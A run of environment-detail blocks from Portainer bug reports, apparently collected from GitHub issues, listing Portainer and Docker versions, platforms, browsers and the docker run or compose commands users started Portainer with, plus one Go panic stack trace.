docker-1.13.1-74.git6e3bb8e.el7.x86_64
* platform (windows/linux):
red hat enterprise linux server release 7.4 (maipo)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: google chrome version 69.0.3497.100 (official build) (64-bit)
portainer version: 1.19.2
* portainer version: 1.19.2-dev
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.19.1
* docker version (managed by portainer): 18.03.0-ce
* platform (windows/linux): both
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): standard with portainer_data named volume
* browser: all
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): ubuntu 16.04.5 lts
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): custom compose file
* browser: firefox 60 / chrome 65
* portainer version: 1.19.1
* docker version (managed by portainer): docker 18.06.0-ce (in swarm mode)
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker stack deploy --compose-file=portainer-agent-stack.yml portainer`
* browser: chrome version 68.0.3440.106 (official build) (64-bit)
* portainer version: 1.18.1
* docker version (managed by portainer): 17 ce
* platform (windows/linux): rancheros
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```
docker run -d -p 9000:9000 -e "virtual_host=my.domain.com" -e "letsencrypt_host=my.domain.com" -e "letsencrypt_email=me@example.com" -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
``` * browser: chrome 69
* portainer version: 1.19.1
* docker version (managed by portainer): 17.12.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run --detach=true --stop-timeout 60 -p "9000:9000" portainer/portainer \\ --external-endpoints /etc/portainer/endpoints.json --sync-interval 60s
* browser: firefox
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.1
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): /portainer -h unix:///var/run/docker.sock
* browser: chrome
* portainer version: `1.19.1`
* docker version (managed by portainer): `18.06.1-ce`
* platform (windows/linux): linux
* command used to start portainer: `docker run -d --name portainer --restart always --mount='type=bind,source=/var/run/docker.sock,dst=/var/run/docker.sock' --mount 'source=portainer,dst=/data' portainer/portainer`
* browser: edge
* portainer version: 1.19.1
* target docker version (the host/cluster you manage): ``` engine: version: 18.03.0 api version: 1.37 (minimum version 1.12) go version: go1.9.4 git commit: 0520e24 built: fri may 4 12:40:05 2018 os/arch: linux/amd64 experimental: false
* platform (windows/linux): photon os
* command used to start portainer: see above
* portainer version: 1.19.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux 4.4.0-109-generic 132-ubuntu smp x86_64 x86_64 x86_64 gnu/linux
* command used to start portainer: ```
docker run \\ --label portainer-instance \\ --network dockernet \\ --network-alias portainer \\ --detach \\ --restart always \\ --volume /var/run/docker.sock:/var/run/docker.sock \\ --volume portainer_data:/data \\ portainer/portainer
``` * browser: firefox on mint my workaround in the short-term will be to change the password to remove the symbol
i believe this can be forced on the console temporarily.
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0
* platform (windows/linux): macos
* browser: safari 11.1.2 on macos 10.13.6
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```yaml portainer: image: portainer/portainer:${portainer_tag} deploy: placement: constraints: - node.role == manager ports: - target: 9000 published: 9000 protocol: tcp volumes: - type: volume source: portainer target: /data command: - -h - tcp://tasks.portainer-agent:9001 - --tlsskipverify networks: - portainer
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0
* platform (windows/linux): macos
* browser: safari 11.1.2 on macos 10.13.6
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```yaml portainer: image: portainer/portainer:${portainer_tag} deploy: placement: constraints: - node.role == manager ports: - target: 9000 published: 9000 protocol: tcp volumes: - type: volume source: portainer target: /data command: - -h - tcp://tasks.portainer-agent:9001 - --tlsskipverify networks: - portainer
* portainer version: 1.19.1
* platform (windows/linux): linux
* browser: chrome
2018/08/16 10:06:30 http: panic serving <ip/port redacted>: runtime error: invalid memory address or nil pointer dereference
goroutine 544647 [running]:
net/http.(*conn).serve.func1( ) /usr/local/go/src/net/http/server.go:1697 +
panic( , ) /usr/local/go/src/runtime/panic.go:491 +
github.com/portainer/portainer/http/security.authorizedendpointaccess( , , , , , , ) /go/src/github.com/portainer/portainer/http/security/authorization.go:173 +
github.com/portainer/portainer/http/security.filterendpoints( , , , , , , , , , ) /go/src/github.com/portainer/portainer/http/security/filter.go:109 +
github.com/portainer/portainer/http/handler/endpoints.(*handler).endpointlist( , , , , ) /go/src/github.com/portainer/portainer/http/handler/endpoints/endpoint_list.go:28 +
github.com/portainer/portainer/http/handler/endpoints.(*handler).(github.com/portainer/portainer/http/handler/endpoints.endpointlist)-fm( , , , ) /go/src/github.com/portainer/portainer/http/handler/endpoints/handler.go:49 +
github.com/portainer/portainer/http/error.loggerhandler.servehttp( , , , ) /go/src/github.com/portainer/portainer/http/error/error.go:24 +
github.com/portainer/portainer/http/security.(*requestbouncer).mwupgradetorestrictedrequest.func1( , , ) /go/src/github.com/portainer/portainer/http/security/bouncer.go:140 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1918 +
github.com/portainer/portainer/http/security.(*requestbouncer).mwcheckauthentication.func1( , , ) /go/src/github.com/portainer/portainer/http/security/bouncer.go:202 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1918 +
github.com/portainer/portainer/http/security.mwsecureheaders.func1( , , ) /go/src/github.com/portainer/portainer/http/security/bouncer.go:119 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1918 +
github.com/gorilla/mux.(*router).servehttp( , , , ) /go/src/github.com/gorilla/mux/mux.go:162 +
net/http.stripprefix.func1( , , ) /usr/local/go/src/net/http/server.go:1957 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1918 +
github.com/portainer/portainer/http/handler.(*handler).servehttp( , , , ) /go/src/github.com/portainer/portainer/http/handler/handler.go:68 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2619 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1801 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2720 + ``` * portainer version: 1.19.1
* docker version (managed by portainer):
* platform (windows/linux): docker version 18.03.0-ce, build 0520e24
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.19.1 (and older too)
* docker version (managed by portainer): 18.03
* platform (windows/linux):linux
* command used to start portainer: swarm
* browser: chrome osx
* portainer version: 1.19.1, 1.18.1, 1.17.1
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux, ubuntu 16.04
* command used to start portainer: `docker-compose up -d` `version: "3.0" networks: mynet: services: portainer: image: portainer/portainer command: --no-auth -h unix:///var/run/docker.sock volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data restart: always ports: - 9000:9000 volumes: portainer_data:` * browser: all
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0-ce, build 0ffa825
* platform (windows/linux): rhel 7.5
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
via docker-compose.yml:
version: '2.2'
services: portainer: container_name: portainer9000 image: portainer/portainer privileged: true userns_mode: host ports: - "9000:9000" command: -h unix:///var/run/docker.sock restart: unless-stopped volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data * browser: google chrome
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): n/a
* browser: chrome ![portainer 2018-08-01 12-45-25](
* portainer version: 1.19.1
* docker version (managed by portainer): standalone 18.03.1-ce
* platform (windows/linux): linux for server
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): same one in getting started
* browser: chrome
* portainer version: 1.17.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux/amd64
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
mkdir /data/server/portainer/data -p
docker network create --driver overlay net-portainer
docker service create \\ --name portainer \\ --detach=true \\ --network net-portainer \\ --publish 9000:9000 \\ --replicas=1 \\ --constraint \'node.role == manager\' \\ --mount type=bind,src=/data/server/portainer/data,dst=/data \\ portainer/portainer -h "tcp://tasks.portainer-agent:9001" --tlsskipverify ```
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): n/a
* browser: chrome
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): n/a
* browser: chrome
* portainer version: 1.19.1
* docker version (managed by portainer): 17.09.0-ce
* platform (windows/linux): linux
* portainer version: 1.19.1
* docker version (managed by portainer): 18.03.0-ce, build 0520e24
* platform (windows/linux):linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy --prune --compose-file /gfs/docker-compose/portainer.yml portainer --with-registry-auth where /gfs/dc/portainer.yml is: version: '3' services: portainer:
image: portainer/portainer:latest
- "9000:9000"
- /etc/hosts:/etc/hosts
- /gfs/portainer:/data
* portainer version: 1.19.0
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): mac
* command used to start portainer: `docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer --no-auth`
* browser: chrome, safari, firefox
* portainer version: 1.18.1
* docker version (managed by portainer):18.05.0-ce
* platform (windows/linux):linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser:chrome
* portainer version: 1.18.1
* docker version (managed by portainer):18.05.0-ce
* platform (windows/linux):linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser:chrome
* portainer version: 1.18.1
* docker version (managed by portainer): 17.06
* platform (windows/linux): linux (photon os)
* command used to start portainer: `docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock --net {network} --name {name} -e virtual_host={domain} -v /{directory}/portainer:/data {image}`
* browser: firefox and chrome
* portainer version: 1.18.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer: `docker-compose up -d` using sample compose file from
* browser: chrome
* portainer version: 1.16.4
* docker version (managed by portainer): 17.05.0-ce
* platform (windows/linux): ubuntu 16.4
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): don't remember
* browser: all
* portainer version: 1.18.1
* docker version (managed by portainer):
* platform (windows/linux): bug on macosx and linux
* command used to start portainer (
`sudo docker service create \\ --name portainer \\ --publish 9000:9000 \\ --replicas=1 \\ --constraint 'node.role == manager' \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ --mount type=bind,src=/opt/portainer,dst=/data \\ portainer/portainer -h unix:///var/run/docker.sock`
* browser: safari and chrome
* portainer version: 1.18.1
* target docker version (the host/cluster you manage): 17.03.2-ce, build f5ec1e2
* platform (windows/linux): linux, google containeros
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run --name portainer --net shared_net -v /var/run/docker.sock:/var/run/docker.sock -v portainer:/data -l "traefik.docker.network=shared_net" -l "traefik.enable=true" -l "traefik.frontend.rule=host:portainer.host.com" -l "traefik.port=9000" -l "traefik.protocol=https" --restart always -d portainer/portainer
* portainer version: 1.18.0
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux redhat 7
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d --label owner=portainerusyd --privileged -p 9000:9000 --name portainer --restart always -v $certs:/certs -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer -h unix:///var/run/docker.sock --logo "xxxx" -l owner=portainerusyd --ssl --sslcert /certs/selfsigned_portainer.crt --sslkey /certs/selfsigned_portainer.key
* browser: google chrome version 67.0.3396.62 (official build) (64-bit)
* portainer version: 1.18.0
* docker version (managed by portainer):
client: version: 18.03.1-ce api version: 1.37 go version: go1.9.5 git commit: 9ee9f40 built: thu apr 26 07:20:16 2018 os/arch: linux/amd64 experimental: false orchestrator: swarm server: engine: version: 18.03.1-ce api version: 1.37 (minimum version 1.12) go version: go1.9.5 git commit: 9ee9f40 built: thu apr 26 07:23:58 2018 os/arch: linux/amd64 experimental: false
* platform : linux
* command used to start portainer : portainer is started with `/opt/portainer/portainer -p :5601`
* browser: safari version 11.1.1 (13605.2.8) **captures**
list of stack of create and deploy one stack
![list](
detail of the stack created:
![stack created](
detail of the stack working but not associated to the good stack
![capture d ecran 2018-07-04 a 11 25 10](
portainer version: 1.18.1
**compose file:** version: \'3\' services: agent: image: portainer/agent environment: # required: should be equal to the service name prefixed by "tasks." when # deployed inside an overlay network agent_cluster_addr: tasks.agent # agent_port: 9001 # log_level: debug volumes: - /var/run/docker.sock:/var/run/docker.sock networks: - agent_network deploy: mode: global portainer: image: portainer/portainer command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" volumes: - portainer_data:/data networks: - agent_network deploy: mode: replicated replicas: 1 placement: constraints: [node.role == manager] networks: agent_network: driver: overlay volumes: portainer_data:
* portainer version: 1.18.1
* docker version (managed by portainer): 17.06.2-ee-11 (win server 2016 standard)
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d --restart always --name portainer -v portainer_data:c:\\data -p 9000:9000 portainer/portainer
* browser: chrome **additional details:**
i created a daemon.json with {"hosts": ["tcp://0.0.0.0:2375","npipe://"]}
to expose the api endpoint and connect poratiner to the container gateway using this port
* portainer version: 1.18.1
* docker version (managed by portainer): docker version 18.03.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker stack deploy --prune --compose-file ./portainer.yml portainer --with-registry-auh where portainer.yml is version: \'3\' services: portainer: image: portainer/portainer:latest ports: - "9000:9000" volumes: - /etc/hosts:/etc/hosts - /gfs/portainer:/data * browser: chrome
* portainer version: 1.18.0
* docker version (managed by portainer): 18.05.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): compose + portainer agent
* browser: firefox
* portainer version: 1.18
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -d -p 9000:9000 --restart=unless-stopped -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data --name portainer portainer/portainer `
* browser: firefox
* portainer version: 1.18.0
* docker version (managed by portainer): 18.05.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): compose
* browser: firefox
* portainer version: 1.18.0
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): amazon linux ami release 2018.03
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): sudo curl -l -o portainer-agent-stack.yml
sudo docker stack deploy --compose-file=portainer-agent-stack.yml portainer
* browser: firefox 60.0.2 (64-bit)
* portainer version: 1.18.0
* docker version (managed by portainer): 18.04.0
* platform (windows/linux): ubuntu 16.04
* portainer version: 1.17.1
* docker version (managed by portainer): linux 18.03.1-ce, windows 17.06.2-ee-12
* platform (windows/linux): both
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
version: "3"
services: portainer: image: portainer/portainer environment: - "constraint:node.role==manager" - "secret portainer-pass" - "admin-password-file \'/run/secrets/portainer-pass\'" - "-h unix:///var/run/docker.sock" volumes: - /mnt/portainer:/data - /var/run/docker.sock:/var/run/docker.sock deploy: labels: - traefik.enable=true - traefik.docker.network=traefik_traefik - traefik.port=9000 - traefik.backend=portainer - traefik.backend.loadbalancer.sticky=true - traefik.frontend.passhostheader=true - traefik.frontend.rule=host:url-to-our-portainer networks: - traefik
networks: traefik: external: true
* portainer version: 1.17.1
* docker version (managed by portainer): docker version 18.03.1-ce, build 9ee9f40
* platform (windows/linux): linux (ubuntu 16.04)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
$ docker volume create portainer_data
$ docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
``` * browser:
google chrome version 67.0.3396.79 (official build) (64-bit)
* portainer version: 1.17.1
* docker version (managed by portainer):17.12.1-ce
* platform (windows/linux):linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose up ```yaml
version: '2'
services: portainer: image: portainer/portainer command: -h unix:///var/run/docker.sock volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data volumes: portainer_data:
* browser: chromium version 66.0.3359.117 (official build) (64-bit) (windows 10)
* portainer version: 1.17.0
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): ubuntu 16.04
* command used to start portainer: docker-compose
* portainer version: 1.17.0 `9c48e9fec5dcb270479c51bb95d692fe2eed1b0eb98aa53ada57d6e2128fd278`
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux (centos 7)
* command used to start portainer: `docker run --restart=always --name=portainer -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docke
r.sock -v portainer_data:/data portainer/portainer:latest`
* browser: n/a
* portainer version: 1.17.0
* docker version (managed by portainer):18.03.1-ce
* container image: ubuntu 16.04 based
* platform (windows/linux): linux
* command used to start portainer: docker-compose
* browser: chrome and safari
* portainer version: 1.17.1
* docker version (managed by portainer): 18.03ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack
* browser: chrome
* portainer version: 1.17.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux (photon os vm inside esxi 6.5)
* command used to start portainer: part of a stack
* browser: safari 11.1 on macos high sierra
* portainer version: 1.17
* docker version (managed by portainer): 17.12, swarm
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
deployed as stack
version: \'3.4\' services: portainer: image: portainer/portainer command: -h unix:///var/run/docker.sock ports: - "9000:9000" volumes: - /var/run/docker.sock:/var/run/docker.sock - vol-portainer-data:/data deploy: replicas: 1 restart_policy: delay: 10s placement: constraints: - node.role == manager * browser: chrome
* portainer version:1.17.0
* docker version (managed by portainer): docker-ce-18.03.0.ce-1.el7.centos.x86
* platform (windows/linux):centos 7
* command used to start portainer (`version: \'3\' services: portainer: image: portainer/portainer:latest ports: - "9000:9000" volumes: - /etc/hosts:/etc/hosts - /glustervol1/portainer:/data):
* browser: chrome and firefox
* portainer version: 1.17.0
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack
* browser: chrome
* portainer version: 1.17.0
* docker version (managed by portainer): 18.04.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
``` portainer: image: portainer/portainer container_name: portainer volumes: - /var/run/docker.sock:/var/run/docker.sock - /mnt/nerv01/.config/.portainer:/data networks: - nerv-net expose: - 9000 restart: unless-stopped
* browser: google chrome 66.0.3359.139
* portainer version: 1.17.0
* docker version (managed by portainer): 18.03
* platform (windows/linux): linux
* portainer version: `portainer/portainer:agent-support` and `portainer/agent:develop`
* docker version (managed by portainer): 18.03.0-ce
* platform (windows/linux): linux, docker for aws
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox
* portainer version: `agent-support`
* docker version (managed by portainer): docker for aws 18.03.0-ce
* platform (windows/linux): aws/linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```shell
# create networks for docker services.
docker network create --driver overlay portainer-agent # create portainer agent service.
docker service create \\ --env agent_cluster_addr='tasks.portainer-agent' \\ --limit-cpu 0.05 \\ --limit-memory 10m \\ --mode global \\ --mount type='bind',src='/var/run/docker.sock',dst='/var/run/docker.sock' \\ --name portainer-agent \\ --network portainer-agent \\ --reserve-cpu 0.01 \\ --reserve-memory 10m \\ portainer/agent:develop # create portainer service.
docker service create \\ --env service_ports=9000 \\ --env virtual_host=' \\ --limit-cpu 0.05 \\ --limit-memory 10m \\ --mount type='volume',volume-driver='cloudstor:aws',src='portainer-data',dst='/data' \\ --name portainer \\ --network haproxy \\ --network portainer-agent \\ --reserve-cpu 0.01 \\ --reserve-memory 10m \\ portainer/portainer:agent-support -h 'tcp://tasks.portainer-agent:9001' --tlsskipverify
``` * browser: firefox
* portainer version: 1.16.5
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: chrome
* portainer version: 1.16.5
* target docker version (the host/cluster you manage): 17.12.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run --name=portainer --hostname=b97cb3594d03 --env="path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" --env="virtual_host=redacted" --env="letsencrypt_host= redacted" --env="letsencrypt_email=redacted" --volume="/docker/portainer:/data" --volume="/var/run/docker.sock:/var/run/docker.sock" --volume="/data" --network=webproxy --expose=9000 --restart=unless-stopped --detach=true portainer/portainer
* browser: safari 11.1
* portainer version: latest image deployed two days ago
* target docker version (the host/cluster you manage): 17.12
* platform (windows/linux): linux, centos
* command used to start portainer (`docker run -p <ip>:9000:9000 portainer/portainer`): docker run -tdi --name portainer -v portainer:/data -v /var/run/docker.sock:/var/run/docker.sock --restart always portainer/portainer
* target swarm version (if applicable):
* browser: chrome
* portainer version: latest of yesterday, f6dd93561a5f
* target docker version (the host/cluster you manage): docker version 17.12.1-ce, build 7390fc6
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer:latest
* target swarm version (if applicable): * browser: firefox esr 52.7.3
* portainer version: 1.16.5
* target docker version (the host/cluster you manage): 18.03
* platform (windows/linux): linux vm in windows host
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): command: --no-auth -h unix:///var/run/docker.sock
* target swarm version (if applicable):
* browser: chrome
* portainer version: latest
* target docker version (the host/cluster you manage): server: engine: version: 18.03.0-ce api version: 1.37 (minimum version 1.12) go version: go1.9.4 git commit: 0520e24 built: wed mar 21 23:08:52 2018 os/arch: linux/amd64 experimental: false * platform (windows/linux): distributor id: ubuntu
description: ubuntu 14.04 lts
release: 14.04
codename: trusty
linux ubuntu14 3.13.0-24-generic #46-ubuntu smp thu apr 10 19:11:08 utc 2014 x86_64 x86_64 x86_64 gnu/linux * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer
* target swarm version (if applicable):
firefox quantum 59.0.2(64-bit)
* portainer version:
1.16.5 (via docker image: f6dd93561a5f)
* target docker version (the host/cluster you manage):
```$ docker version
client: version: 17.12.0-ce api version: 1.35 go version: go1.9.2 git commit: c97c6d6 built: wed dec 27 20:05:22 2017 os/arch: windows/amd64 server: engine: version: 17.12.0-ce api version: 1.35 (minimum version 1.12) go version: go1.9.2 git commit: c97c6d6 built: wed dec 27 20:12:29 2017 os/arch: linux/amd64 experimental: true
* platform (windows/linux):
windows 10 pro
* command used to start portainer :
```docker-compose up```
based on the [portainer-compose]( github example, mount points changed for usage on windows platform
version: \'2\' services: proxy: build: nginx/ container_name: "portainer-proxy" ports: - "8080:80" networks: - local templates: image: portainer/templates container_name: "portainer-templates" networks: - local portainer: image: portainer/portainer container_name: "portainer-app"
#automatically choose \'manage the docker instance where portainer is running\' by adding <--host=unix:///var/run/docker.sock> to the command command: --templates networks: - local volumes: - //var/run/docker.sock:/var/run/docker.sock - c:\\programdata\\portainer:/data watchtower: image: v2tec/watchtower container_name: "portainer-watchtower" command: --cleanup portainer-app portainer-watchtower portainer/templates networks: - local volumes: - //var/run/docker.sock:/var/run/docker.sock
networks: local: driver: bridge
``` * browser:
google chrome version 65.0.3325.181 (official build) (64-bit)
* portainer version: 1.16.4
* target docker version (the host/cluster you manage): 17.12.0-ce, build c97c6d6
* platform (windows/linux): linux
* command used to start portainer (`docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer -h unix:///var/run/docker.sock`) *sorry for my bad english*
* portainer version: lasted develop branch @commits on mar 18, 2018 @
* target docker version (the host/cluster you manage): 17.12.0-ce (single one)
* platform (windows/linux): linux (ubuntu 16.04 x64)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): just run binary program not with container image
* target swarm version (if applicable): docker 17.12.0-ce , api:1.35
* browser: chrome 65.0.3325.162(x64) <img width="1099" alt="screen-2018-03-20 19 57 38" src=" ">
@deviantony
* portainer version: 1.16.4
* platform (windows/linux): linux
* portainer version: 1.16.3
* target docker version (the host/cluster you manage):17.12.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack deploy
* target swarm version (if applicable): * browser: chrome
* portainer version: 1.15.3 | 1.16.2
* target docker version (the host/cluster you manage): 1.12.6
* platform (windows/linux): centos 7 * command used to start portainer: `docker run -d -p 9000:9000 --privileged --restart=unless-stopped -v /var/run/docker.sock:/var/run/docker.sock -v /export/docker_volumes/portainer:/data portainer/portainer:latest`
* browser: firefox
* portainer version: 16.x (different versions tested)
* target docker version (the host/cluster you manage): 17.06.2
* platform (windows/linux): linux centos 7
* browser: firefox 58.0.2 (64 bits) thanks for your help !
* portainer version: 1.16.2
* target docker version (the host/cluster you manage): 17.06.02-ce
* platform (windows/linux): linux (centos 7.2.1511) thank you
* portainer version: 1.16.2
* target docker version: 17.12.0-ce
* platform: linux
* command used to start portainer: `docker run -d -v /var/run/docker.sock:/var/run/docker.sock -v /data/portainer:/data -p 9000:9000 --restart=always --name portainer portainer/portainer --ssl --sslcert portainer.cert --sslkey portainer.key.pem`
* portainer version: 1.16.1
* target docker version (the host/cluster you manage): 18.01.0-ce
* platform (windows/linux): arch linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer
* target swarm version (if applicable): n/a
* browser: all
* portainer version: 0.16.1
* target docker version (the host/cluster you manage): 17.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): i start it via docker compose - [docker-compose.yml](
* target swarm version (if applicable): i don't know how to determine this, sorry.
* browser: chrome 61
* portainer version: 1.15.5
* browser: chrome 63.0.3239.132, tested with other versions of chrome as well
* portainer version: 1.16.0
* target docker version: docker-ce: installed: 17.12.0~ce-0~debian
* platform (windows/linux): debian 9
* command used to start portainer: (default) `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`
* browser: chrome (63.0.3239.132)
* portainer version: 1.16 `portainer/portainer:pr1586`
* target docker version (the host/cluster you manage): 17.06.2-ee-6
* platform (windows/linux): windows 2016
* command used to start portainer: `docker service create --name portainer --publish published=9000,target=9000,mode=host --endpoint-mode dnsrr --replicas=1 --constraint 'node.role == manager' --mount type=volume,src=portainer,dst=c:/data portainer/portainer:pr1586`
* browser: chrome 63
* portainer version: 1.16.0
* target docker version (the host/cluster you manage): 17.06.2-ee-6
* platform (windows/linux): windows 2016
* command used to start portainer: `docker service create --name portainer --publish published=9000,target=9000,mode=host --endpoint-mode dnsrr --replicas=1 --constraint 'node.role == manager' --mount type=volume,src=portainer,dst=c:/data portainer/portainer:latest`
* target swarm version (if applicable): built in?
* browser: chrome 63
* portainer version: 1.16.0
* target docker version (the host/cluster you manage):
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* target swarm version (if applicable):
* portainer version:1.15.5
target docker version (the host/cluster you manage):client: version: 17.06.1-ce api version: 1.30 go version: go1.8.3 git commit: 874a737 built: thu aug 17 22:51:12 2017 os/arch: linux/amd64 server: version: 17.06.1-ce api version: 1.30 (minimum version 1.12) go version: go1.8.3 git commit: 874a737 built: thu aug 17 22:50:04 2017 os/arch: linux/amd64 experimental: false
* platform (windows/linux):ubuntu16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker service create \\ --name portainer \\ --publish 9000:9000 \\ --constraint 'node.role == manager' \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ --mount type=bind,src=/pub/docker_portainer/data,dst=/data \\ portainer/portainer:latest \\ -h unix:///var/run/docker.sock
* target swarm version (if applicable):
* browser:goole chrome version 63.0.3239.132 (official build) (64-bit)
* portainer version: 1.15.5
* target docker version (the host/cluster you manage): 17.12.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 127.0.0.1:9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainerdata:/data --name portainer portainer/portainer
* target swarm version (if applicable): -
* browser: firefox 57.0.3
* portainer version: 1.15.5.
* target docker version (the host/cluster you manage): 17.05
* platform (windows/linux): linux
* target swarm version (if applicable):
* browser: chromium
* portainer version: 1.15.5
* target docker version (the host/cluster you manage): 17.10.0-ce, build f4ffd2511c
* platform (windows/linux): archlinux amd64
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): not a dockerized install `/opt/portainer/portainer -d /opt/portainer/data -p :6060`
